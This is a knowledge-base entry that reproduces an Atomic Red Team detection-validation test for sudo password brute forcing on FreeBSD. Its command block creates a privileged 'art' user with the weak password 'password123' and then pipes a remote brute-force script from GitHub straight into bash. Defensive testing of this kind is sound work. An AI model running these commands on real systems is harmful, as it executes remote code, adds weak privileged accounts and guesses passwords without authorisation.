---
atomic_guid: "abcde488-e083-4ee7-bc85-a5684edd7541"
title: "SUDO Brute Force - FreeBSD"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.001"
attack_technique_name: "Brute Force: Password Guessing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml"
build_date: "2026-04-26 14:38:39"
executor: "bash"
aliases:
  - "abcde488-e083-4ee7-bc85-a5684edd7541"
  - "SUDO Brute Force - FreeBSD"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# SUDO Brute Force - FreeBSD

An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 

This test creates the "art" user with a password of "password123", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user

## Metadata

- Atomic GUID: abcde488-e083-4ee7-bc85-a5684edd7541
- Technique: T1110.001: Brute Force: Password Guessing
- Platforms: linux
- Executor: bash
- Elevation Required: True
- Dependency Executor: sh
- Source Path: atomics/T1110.001/T1110.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.001]]

## Input Arguments

### remote_url

- description: url of remote payload
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh

## Dependencies

Check if running on a FreeBSD based machine.

### Prerequisite Check

```text
if grep -iq "FreeBSD" /etc/os-release; then echo "FreeBSD"; else echo "NOT FreeBSD"; exit 1; fi
if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
if [ -x "$(command -v bash)" ]; then echo "bash is installed"; else echo "bash is NOT installed"; exit 1; fi
```

### Get Prerequisite

```text
pkg update && pkg install -y sudo curl bash
```

## Executor

- elevation_required: True
- name: bash

### Command

```bash
pw adduser art -g wheel -s /bin/sh
echo "password123" | pw usermod art -h 0
su art
cd /tmp
curl -s #{remote_url} |bash
```

### Cleanup

```bash
rmuser -y art
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml)
